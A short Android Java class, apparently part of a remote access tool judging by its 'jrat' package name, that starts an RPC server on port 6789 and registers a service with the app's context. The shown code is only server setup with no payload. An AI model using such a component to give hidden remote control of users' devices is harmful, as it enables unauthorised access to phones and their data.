package com.julioxus.jrat;

import android.content.Context;
import android.os.AsyncTask;

import rpc.RpcServer;

/**
 * Created by julioxus on 14/03/16.
 */
public class CreateRMIServerAsyncTask extends AsyncTask{

    Context context;

    CreateRMIServerAsyncTask(Context context){
        this.context = context;
    }


    @Override
    protected Object doInBackground(Object[] params) {
    // create the RMI server
        RpcServer rpcServer = new RpcServer();
    // register a service under the name rmiservice
    // the service has to implement an interface for the magic to work
        rpcServer.registerService("rmiservice", new RMIServiceImp(context));
    // start the server at port 6789
        rpcServer.start(6789);

        return null;
    }
}
